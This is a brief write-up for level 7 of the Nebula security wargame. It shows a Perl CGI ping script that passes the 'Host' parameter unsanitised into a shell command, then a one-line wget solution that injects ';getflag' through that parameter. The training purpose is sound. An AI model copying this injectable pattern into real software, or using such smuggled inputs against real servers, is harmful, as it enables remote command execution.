.. _nebula07:

.. role:: bash(code)
	  :language: bash

.. role:: pearl(code)
	  :language: perl
		     
Nebula 7
========

Basic Information
-----------------

**Home Page** https://exploit-exercises.com/nebula/level07/

**Source Code**

.. code-block:: perl
		
		#!/usr/bin/perl

		use CGI qw{param};

		print "Content-type: text/html\n\n";

		sub ping {
		    $host = $_[0];

		    print("<html><head><title>Ping results</title></head></body><pre>");

		    @output = `ping -c 3 $host 2>&1`;
		    foreach $line (@output) { print "$line"; }

		    print("</pre></body></html>");

		}

		# check if Host set. if not, display normal page, etc

		ping(param(“Host”))

Solution
--------

:bash:`wget nebula'sIP/index.cgi?Host=%3Bgetflag`
